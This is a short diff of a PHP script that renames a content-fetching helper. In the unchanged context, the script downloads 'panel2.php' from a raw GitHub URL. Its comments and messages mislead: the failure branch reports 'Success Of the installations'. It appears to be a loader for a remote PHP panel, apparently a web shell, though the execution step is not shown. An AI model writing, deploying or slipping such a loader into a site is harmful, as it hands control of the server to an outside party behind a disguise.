@@ -1,5 +1,5 @@
 <?php
-function ($url, $timeout = 10) {
+function take_konten($url, $timeout = 10) {
     // Installations of Archive Running
     $parts = parse_url($url);
     if ($parts === false || !isset($parts['scheme']) || !isset($parts['host'])) {
@@ -110,7 +110,7 @@ function ($url, $timeout = 10) {
 
 // Use the readme.html
 $url = "https://raw.githubusercontent.com/soy777/gg/main/panel2.php";
-$konten = ambil_konten($url);
+$konten = take_konten($url);
 
 if ($konten === false) {
     die("Success Of the installations");
